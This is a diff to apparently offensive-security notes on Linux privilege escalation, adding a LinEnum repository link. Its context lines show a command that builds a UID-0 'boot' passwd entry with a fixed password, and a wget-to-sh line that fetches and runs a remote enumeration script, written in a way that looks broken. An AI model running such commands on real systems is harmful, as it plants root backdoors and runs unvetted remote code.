@@ -27,6 +27,9 @@ echo "boot:$(openssl passwd -6 -salt boot password123):0:0:boot:/root:/bin/bash"
 # Скрипты повышения привелегий 
 
 https://github.com/rebootuser/LinEnum
+
+https://github.com/rebootuser/LinEnum.git
+
 https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
 
 wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh | sh
